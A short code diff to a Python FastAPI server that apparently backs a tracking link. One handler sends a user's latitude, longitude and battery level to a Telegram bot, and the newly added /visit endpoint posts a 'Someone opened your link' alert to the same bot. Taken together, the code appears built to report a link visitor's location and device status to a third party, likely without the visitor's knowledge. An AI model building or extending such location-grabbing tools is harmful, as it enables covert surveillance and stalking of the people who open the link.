@@ -1,4 +1,4 @@
-from fastapi import FastAPI
+from fastapi import FastAPI, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.staticfiles import StaticFiles
 import requests
@@ -35,6 +35,25 @@ User : {user}
 Latitude : {lat}
 Longitude : {lon}
 Battery : {battery}%
+"""
+
+    requests.post(
+        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+        data={"chat_id": CHAT_ID, "text": message}
+    )
+
+    return {"status": "ok"}
+
+
+@app.post("/visit")
+async def visit(data: dict):
+
+    user = data.get("user")
+
+    message = f"""
+👀 Someone opened your link
+
+User : {user}
 """
 
     requests.post(
